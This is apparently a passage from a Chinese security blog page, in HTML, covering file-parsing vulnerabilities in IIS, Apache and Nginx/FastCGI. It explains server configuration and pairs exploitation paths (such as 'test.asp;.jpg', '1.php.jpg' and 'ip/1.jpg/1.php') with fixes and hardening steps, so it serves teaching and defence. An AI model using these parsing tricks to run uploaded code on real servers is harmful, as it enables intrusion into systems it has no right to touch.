+<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="漏洞介绍及成因-2"><a href="#漏洞介绍及成因-2" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>IIS6.0 在处理含有特殊符号的文件路径时会出现逻辑错误。</p>
+<h4 id="漏洞前提1"><a href="#漏洞前提1" class="headerlink" title="漏洞前提1"></a>漏洞前提1</h4><p>IIS6.0</p>
+<h4 id="漏洞复现1"><a href="#漏洞复现1" class="headerlink" title="漏洞复现1"></a>漏洞复现1</h4><p>利用方式1</p>
+<p>新建一个名字为test.asp的目录，然后访问该目录下的所有文件，都会被当作asp执行。</p>
+<p>访问路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp&#x2F;1.jpg</span><br></pre></td></tr></table></figure>
+
+<p>利用方式2</p>
+<p>第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行</p>
+<p>访问路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞前提2"><a href="#漏洞前提2" class="headerlink" title="漏洞前提2"></a>漏洞前提2</h4><p>IIS7.5</p>
+<h4 id="漏洞复现2"><a href="#漏洞复现2" class="headerlink" title="漏洞复现2"></a>漏洞复现2</h4><p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，php默认开启 “cgi.fix_pathinfo”, 会对文件进行 “修理” 。若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1、过滤.asp/xm.jpg，通过ISApi组件过滤。</p>
+<p>2、对新建目录文件名进行过滤，不允许新建包含‘.‘的文件。</p>
+<p>3、限制上传的脚本执行权限，不允许执行脚本</p>
+<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="apache学习"><a href="#apache学习" class="headerlink" title="apache学习"></a>apache学习</h3><h4 id="apache配置文件"><a href="#apache配置文件" class="headerlink" title="apache配置文件"></a>apache配置文件</h4><p>主要的配置文件在conf文件夹中,额外的存在于conf.d文件夹中,我们如果不想单独的去修改主要的配置文件http.d,我们可以临时的在conf.d中新建立一个conf文件,来修改和添加我们的配置,最终我们可以在主配置文件中使用命令Include去包涵我们的配置文件。</p>
+<h4 id="apache与php的结合"><a href="#apache与php的结合" class="headerlink" title="apache与php的结合"></a>apache与php的结合</h4><p>1、CGI</p>
+<p>2、FastCGI</p>
+<p>3、Module</p>
+<p>在https.conf(主配置文件)或者单独的配置文件中都可以使用&lt;IfModule&gt;指令来加载php_module。</p>
+<h4 id="apache的配置指令"><a href="#apache的配置指令" class="headerlink" title="apache的配置指令"></a>apache的配置指令</h4><h5 id="lt-Directory-gt-指令"><a href="#lt-Directory-gt-指令" class="headerlink" title="&lt;Directory&gt;指令"></a>&lt;Directory&gt;指令</h5><p>&lt;Directory&gt;和&lt;/Directory&gt;用于封装一组指令，使之仅对某个目录及其子目录生效。</p>
+<p>语法：&lt;Directory Directory-path&gt; … &lt;/Directory&gt;。</p>
+<h5 id="lt-Files-gt-指令"><a href="#lt-Files-gt-指令" class="headerlink" title="&lt;Files&gt;指令"></a>&lt;Files&gt;指令</h5><p>提供基于文件名的访问控制，类似于&lt;Directory&gt;和&lt;Location&gt;指令。</p>
+<p>语法：&lt;Files filename&gt; …&lt;/Files&gt;</p>
+<p>&lt;Files&gt;能嵌入到&lt;Directory&gt;段中以限制它们作用的文件系统范围。</p>
+<p>filename参数应当是一个文件名或是一个包含通配符的字符串，其中”?”匹配任何单个字符，”*”匹配任何字符串序列。在”~”字符之后同样可以使用正则表达式。</p>
+<h5 id="lt-FilesMatch-gt-指令"><a href="#lt-FilesMatch-gt-指令" class="headerlink" title="&lt;FilesMatch&gt;指令"></a>&lt;FilesMatch&gt;指令</h5><p>包含作用于与正则表达式匹配的文件名的指令</p>
+<p>语法&lt;FilesMatch regex&gt; …&lt;/FilesMatch&gt;</p>
+<p>&lt;FilesMatch&gt;指令就像&lt;Files&gt;指令一样提供了针对文件名的访问控制。然而，它使用的是正则表达式。比如说：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(gif|jpe?g|png)$&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将匹配最常见的internet图形文件格式。 </p>
+<h5 id="lt-Location-gt-指令"><a href="#lt-Location-gt-指令" class="headerlink" title="&lt;Location&gt;指令"></a>&lt;Location&gt;指令</h5><p>将封装的指令作用于匹配的URL。</p>
+<p>例如，拒绝访问任何以”/private”开头的URL路径。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocationMatch <span class="string">&quot;^/private&quot;</span>&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/LocationMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="lt-LocationMatch-gt-指令"><a href="#lt-LocationMatch-gt-指令" class="headerlink" title="&lt;LocationMatch&gt;指令"></a>&lt;LocationMatch&gt;指令</h5><p>将封装的指令作用于正则表达式匹配的URL。</p>
+<p>&lt;LocationMatch&gt;和&lt;Location&gt;指令相同，提供了基于URL的访问控制。但它使用正则表达式作为参数，而不是简单字符串。比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocationMatch &quot;&#x2F;(extra|special)&#x2F;data&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将匹配包含子串”/extra/data”或”/special/data”的URL。</p>
+<p>更多介绍</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jishume&#x2F;articles&#x2F;2079697.html</span><br></pre></td></tr></table></figure>
+
+<h5 id="SetHandler指令"><a href="#SetHandler指令" class="headerlink" title="SetHandler指令"></a>SetHandler指令</h5><p>为具有特定文件 extensions 的文件配置特定处理程序。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h5><p><code>AddType</code>指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。本指令可用来增加没有在媒体类型文件(参阅<code>TypesConfig</code>指令)中定义的映射关系。</p>
+<h5 id="AddHandle"><a href="#AddHandle" class="headerlink" title="AddHandle"></a>AddHandle</h5><p>指定带extension扩展名的文件应被handler-name处理器来处理。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。例如，为了把扩展名为<code>.cgi</code>的文件作为CGI脚本来处理，你应该定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .cgi</span><br></pre></td></tr></table></figure>
+
+<p>一旦将上述定义放在你的http.conf文件中，所有包含<code>.cgi</code>扩展名的文件，都会被当成是CGI程序。</p>
+<p><code>AddHandler application/x-httpd-php .jpg</code>。</p>
+<p>.jpg后缀的文件会交给php去处理,进而执行文件中的php代码。</p>
+<h3 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="漏洞介绍及成因-3"><a href="#漏洞介绍及成因-3" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题。</p>
+<p>Apache文件解析漏洞涉及到一个解析文件的特性：</p>
+<p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.types内），则继续向左识别，当我们请求这样一个文件：steady.xxx.yyy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady-&gt;无法识别，向左xxx-&gt;无法识别，向左-&gt;php-&gt;发现后缀是php，交给php处理这个文件。</span><br></pre></td></tr></table></figure>
+
+<p>1.php.jpg成功的前提是:</p>
+<ul>
+<li><p>mime文件或者AddType没有设置jpg的对应的类型,apache识别不了jpg,进而识别PHP(大多数都能识别jpg)</p>
+</li>
+<li><p>配置文件使用<code>AddHandler</code>,以至于无论后缀文件是什么,有几个,只要看见该指令指定的文件类型,就交给php解析</p>
+<p><code>AddHandler application/x-httpd-php 文件类型</code></p>
+</li>
+</ul>
+<p>以上条件满足之一就可(1.php.xxx同理)</p>
+<p>无论后缀有几个,有多少只要看见php就会被解析,前提:</p>
+<ul>
+<li>使用了AddHandle、&lt;FilesMatch&gt;</li>
+</ul>
+<h4 id="Apache的-htaccess利用技巧"><a href="#Apache的-htaccess利用技巧" class="headerlink" title="Apache的.htaccess利用技巧"></a>Apache的.htaccess利用技巧</h4><p><code>.htaccess</code> 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 <code>Apache</code> 的 <code>AllowOverride</code> 指令来设置。</p>
+<h6 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h6><p><code>.htaccess</code> 文件中的配置指令作用于 <code>.htaccess</code> 文件所在的目录及其所有子目录，子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
+<h6 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器的主配置文件将 AllowOverride 设置为 All</span><br></pre></td></tr></table></figure>
+
+<p>注意该文件的名字可以随意更改。</p>
+<h6 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h6><p>1、htaccess文件</p>
+<ul>
+<li>&lt;Directory&gt;中配置<code>AllowOverride None </code></li>
+</ul>
+<p>也就是在当前目录下htaccess文件不起作用</p>
+<ul>
+<li>http.conf主配置文件中禁止该类文件运行</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;.ht*&quot;&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、php文件</p>
+<ul>
+<li>限制php的运行,直接使用&lt;Files&gt;禁止任何php的运行以及访问</li>
+<li>如果想允许php文件的运行,使用&lt;FilesMatch&gt;中的正则表达式严格限制后缀,不建议使用AddHandle</li>
+</ul>
+<p>3、隐藏banner信息</p>
+<p>ServerTokens OS　 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）</p>
+<p>ServerSignature On 修改为：ServerSignature Off（不回显apache版本信息）</p>
+<p>4、删除默认网站及页面</p>
+<p>删除默认的页面，防止泄露服务器信息</p>
+<p>5、合理配置apache的运行账户</p>
+<p>为apache单独建立一个运行账户及账户组，并在httpd.conf配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure>
+
+<p>6、合理控制apache运行账户对磁盘的写入，执行权限</p>
+<p>取消apache运行账户对网站目录的写入权限，上传目录除外，其他非网站目录尽量不给权限</p>
+<p>7、配置httpd.conf取消对上传目录的php执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">    &lt;FilesMatch &quot;.(php|php5)$&quot;&gt;     </span><br><span class="line">        Deny from all     </span><br><span class="line">    &lt;&#x2F;FilesMatch&gt; </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure>
+
+<p>8、配置httpd.conf限制禁止访问的文件夹，例如后台目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">        Deny from all     </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure>
+
+<p>9、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">    Allow from 192.168.1.111    </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure>
+
+<p>10、配置httpd.conf修改修改监听端口来防止一些内部系统被扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listen 12345 </span><br></pre></td></tr></table></figure>
+
+<p>11、关闭对.htaccess的支持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None </span><br></pre></td></tr></table></figure>
+
+<h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h4 id="漏洞介绍及成因-4"><a href="#漏洞介绍及成因-4" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>由于配置错误导致的目录遍历。</p>
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接访问ip，比如127.0.0.1，可遍历路径。</p>
+<p>修改apache配置文件httpd.conf</p>
+<p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p>
+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h3 id="Nginx学习"><a href="#Nginx学习" class="headerlink" title="Nginx学习"></a>Nginx学习</h3><h4 id="nginx是如何解析php的"><a href="#nginx是如何解析php的" class="headerlink" title="nginx是如何解析php的?"></a>nginx是如何解析php的?</h4><h5 id="CGI、fast-cgi"><a href="#CGI、fast-cgi" class="headerlink" title="CGI、fast-cgi"></a>CGI、fast-cgi</h5><p>早期服务器只能解析html、js这样的静态资源,但是我们如果要想解析php这样的动态语言怎么办？服务器解析不了我们可以使用php解析器,然后解析器与服务器之间进行交流,不同的解析器与服务器进行交流要靠CGI协议,只要你按照CGI协议去编写程序,就能实现他们之间的交流.常见的php解析器(遵循CGI协议)有php-cgi、php-fpm.</p>
+<p>对于cgi协议,服务器在每次接受到请求的时候都会fork一个进程,请求结束就要kill这个进程,有1000个请求,就要kill、fork1000次,很显然有点浪费.</p>
+<p>Fast-cgi每次fork一个进程的时候,并不会去立即kill,而是一个fork可以处理多个请求。</p>
+<p><strong>fast-cgi一个进程会处理多个请求,大大提高了效率</strong></p>
+<p>php-fpm是一种利用fast-cgi的php解析器,提供进程管理的功能.</p>
+<p>进程包含master和worker进程,master进程之后一个负责监听端口,接受服务器的请求,worker进程可以有多个,每一个进程内部都有php解析器,是php代码执行的地方.</p>
+<h5 id="nginx与php-fpm"><a href="#nginx与php-fpm" class="headerlink" title="nginx与php-fpm"></a>nginx与php-fpm</h5><p>我们知道nginx有反向代理的功能,可以来处理客户端、服务端之间的请求和相应,而php-fpm在这里可以说是一个代理服务器的作用,nginx服务器接受到文件不会去处理,会交给php解析器php-fpm。</p>
+<p>nginx.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           /Applications/MxSrvs/www;</span><br><span class="line">    <span class="comment">//后面的地址就是php解析器,php-fpm的的地址</span></span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">10080</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">   <span class="comment">//设置传递给php解析器的参数值,以下的路径是指在安装php-fpm主机上存放php文件的路径</span></span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">  <span class="comment">//SCRIPT_FILENAME是什么呢？他是一个参数,我们nginx需要把参数传递给&quot;代理服务器&quot;php-fpm,后面的就是参数的值,只不过他们是由固定变量组成的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>常见的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param SCRIPT_FILENAME $documentroot$fastcgi_script_name;#脚本文件请求的路径</span><br><span class="line">fastcgi_param QUERY_STRING $query_string; #请求的参数;如?app&#x3D;123</span><br><span class="line">fastcgi_param REQUEST_METHOD $request_method; #请求的动作(GET,POST)</span><br><span class="line">fastcgi_param CONTENT_TYPE $content_type; #请求头中的Content-Type字段</span><br><span class="line">fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。</span><br><span class="line">fastcgi_param SCRIPT_NAME $fastcgi_script_name; #脚本名称</span><br><span class="line">fastcgi_param REQUEST_URI $request_uri; #请求的地址不带参数</span><br><span class="line">fastcgi_param DOCUMENT_URI document_uri; #与document_uri; #与uri相同。</span><br><span class="line">fastcgi_param DOCUMENT_ROOT $document_root; #网站的根目录。在server配置中root指令中指定的值</span><br><span class="line">fastcgi_param PATH_INFO $path_info;#可自定义变量</span><br></pre></td></tr></table></figure>
+
+<h5 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www.example.com</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">      Nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">路由到www.example.com&#x2F;index.php</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">加载nginx的fast-cgi模块</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">fast-cgi监听127.0.0.1:9000地址</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">www.example.com&#x2F;index.php请求到达127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 监听127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 接收到请求，启用worker进程处理请求</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 处理完请求，返回给nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">nginx将结果通过http返回给浏览器</span><br></pre></td></tr></table></figure>
+
+<h4 id="nginx的pathinfo配置"><a href="#nginx的pathinfo配置" class="headerlink" title="nginx的pathinfo配置"></a>nginx的pathinfo配置</h4><p>讲之前我们需要理解一下伪静态,静态是指静态页面比如html、css等,没有页面交互,动态自然指的是动态页面,有页面交互,伪静态就是动态页面的静态表现.</p>
+<p>我们在开发的时候经常使用MVC模式,由此我们在URL中访问网站也需要指定M、V、C参数,比如<code>http://www.cxzaixian.com/index.php?m=topic&amp;a=detail&amp;tid=82</code>,转化为伪静态之后是<code>http://www.cxzaixian.com/index.php/topic/detail/tid/82.html</code>.</p>
+<p>后台代码拿到为静态URL之后,由相应的解析逻辑代码进行转化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache服务器本身是支持pathinfo的，通过简单修改几项配置即可。当配置支持pathinfo后，在php应用程序中，通过_SERVER[&#39;PATH_INFO&#39;]变量获取pathinfo值为&#x2F;topic&#x2F;detail&#x2F;tid&#x2F;82.html。 我们就可以很容易通过php逻辑代码来解析出controller文件、action方法、以及剩余的动态参数，进而就可以返回正确的网页响应。</span><br><span class="line">但是我们要说的nginx服务器默认是不支持pathinfo模式访问。实质上就是nginx不会去设置环境变量PATH_INFO 的值，导致php应用程序不能通过_SERVER[&#39;PAHT_INFO&#39;]来获取path_info, 也就不能解析出对应的动态参数。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    <span class="comment">#定义变量 $path_info ，用于存放pathinfo信息</span></span><br><span class="line">    set $path_info <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">#定义变量 $real_script_name，用于存放真实地址</span></span><br><span class="line">    set $real_script_name $fastcgi_script_name;</span><br><span class="line">    <span class="comment">#如果地址与引号内的正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span> ($fastcgi_script_name ~ <span class="string">&quot;^(.+?\.php)(/.+)$&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">#将文件地址赋值给变量 $real_script_name</span></span><br><span class="line">        set $real_script_name $<span class="number">1</span>;</span><br><span class="line">            <span class="comment">#将文件地址后的参数赋值给变量 $path_info</span></span><br><span class="line">            set $path_info $<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#配置fastcgi的一些参数</span></span><br><span class="line">    fastcgi_param SCRIPT_NAME $real_script_name;</span><br><span class="line">    fastcgi_param PATH_INFO $path_info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用-php-的-cgi-fix-pathinfo-功能"><a href="#使用-php-的-cgi-fix-pathinfo-功能" class="headerlink" title="使用 php 的 cgi.fix_pathinfo 功能"></a>使用 php 的 cgi.fix_pathinfo 功能</h5><p>此方式通过将 <code>php.ini</code> 当中的 <code>cgi.fix_pathinfo</code> 设置为1, 并且在 <code>nginx</code> 中加入一条 <code>fastcgi_param PATH_INFO $fastcgi_script_name;</code></p>
+<p>当开启 <code>fix_pathinfo</code> 之后, <code>php</code> 会根据 <code>CGI 1.1</code> 的规范来分析 <code>SCRIPT_FILENAME</code>, 从中截取什么是真正的执行脚本, 什么是 <code>PATH_INFO</code>, 并且修正对应的变量</p>
+<h3 id="FAST-CGI解析漏洞"><a href="#FAST-CGI解析漏洞" class="headerlink" title="FAST-CGI解析漏洞"></a>FAST-CGI解析漏洞</h3><h4 id="漏洞介绍及成因-5"><a href="#漏洞介绍及成因-5" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>nginx.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php($|&#x2F;) &#123;</span><br><span class="line">     fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">     fastcgi_index  index.php;</span><br><span class="line">     set $script    $uri;</span><br><span class="line">     set $path_info &quot;&quot;;</span><br><span class="line">     if ($uri ~ &quot;^(.+\.php)(&#x2F;.*)&quot;) &#123;</span><br><span class="line">          set  $script     $1;</span><br><span class="line">          set  $path_info  $2;</span><br><span class="line">     &#125;</span><br><span class="line">     include       fastcgi_params;</span><br><span class="line">     fastcgi_param SCRIPT_FILENAME   $document_root$script;</span><br><span class="line">     fastcgi_param SCRIPT_NAME       $script;</span><br><span class="line">     fastcgi_param PATH_INFO         $path_info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过正则匹配以后, SCRIPT_NAME会被设置为”fake.jpg/foo.php”, 继而构造成SCRIPT_FILENAME传递个PHP CGI，fix_pathinfo开启之后PHP会认为SCRIPT_FILENAME是fake.jpg, 而foo.php是PATH_INFO, 然后PHP就把fake.jpg当作一个PHP文件来解释执行。</p>
+<p>最重要的一点是 <code>php-fpm.conf</code> 中的 <code>security.limit_extensions</code> 配置项限制了 <code>fastcgi</code> 解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许 <code>fastcgi</code> 将 <code>.png</code> 等文件当做代码解析。</p>
+<p>尝试浏览器访问一下,具体的文件路径,可以看到脚本名字、脚本路径</p>
+<p><code>&lt;?php var_dump($_SERVER)?&gt;</code></p>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25A99970-DF7A-4DB1-9CFA-8A634944B783.png" alt="25A99970-DF7A-4DB1-9CFA-8A634944B783"></p>
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x2F;1.jpg&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><code>http://xiumu.blog.51cto.com/hacker.jpg/abc.php</code>成功利用的前提</p>
+<p>1、php.ini中的配置选项<code>cgi.fix_pathinfo=1</code>并且php-fpm中的<code>security.limit_extensions</code>没有开启</p>
+<p>从5.3.9开始,php官方加入了一个配置”security.limit_extensions”,默认只允许执行扩展名为”.php”的文件,造成了其他类型的文件不支持的问题.</p>
+<p>将 cgi.fix_pathinfo = 0 ,可能会导致很多MVC框架(如ThinkPHP)对url美化无法正常运行。</p>
+<p>防御思路</p>
+<p>1、开启</p>
+<p><code>security.limit_extensions=.php</code> 只允许后缀为php的文件解析</p>
+<p>2、</p>
+<p>使用 nginx 的 fastcgi_split_path_info 功能</p>
+<p>此种方式依赖 <code>nginx</code> 的 <code>fastcgi_split_path_info</code> 指令, 该指令通过正则表达式来对 <code>uri</code> 进行处理, 从中分理出真实脚本文件和 <code>PATH_INFO</code>, 并根据正则捕获组来设置两个重要变量</p>
+<ol>
+<li>$fastcgi_script_name</li>
+<li>$fastcgi_path_info</li>
+</ol>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png" alt="8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC"></p>
